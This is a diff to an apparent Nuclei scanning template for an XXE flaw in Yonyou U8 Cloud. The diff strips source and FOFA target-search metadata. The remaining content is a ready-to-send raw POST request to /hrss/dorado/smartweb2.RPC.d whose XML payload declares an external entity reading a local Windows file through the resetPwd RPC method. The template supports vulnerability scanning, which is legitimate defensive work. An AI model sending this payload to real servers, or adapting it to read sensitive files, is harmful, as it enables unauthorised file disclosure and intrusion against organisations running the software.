@@ -3,12 +3,8 @@ info:
   name: 用友U8 Cloud smartweb2.RPC.d 存在XXE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/diwgmmxg701u63gu'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: diwgmmxg701u63gu
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "file:///C://windows//win.ini" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
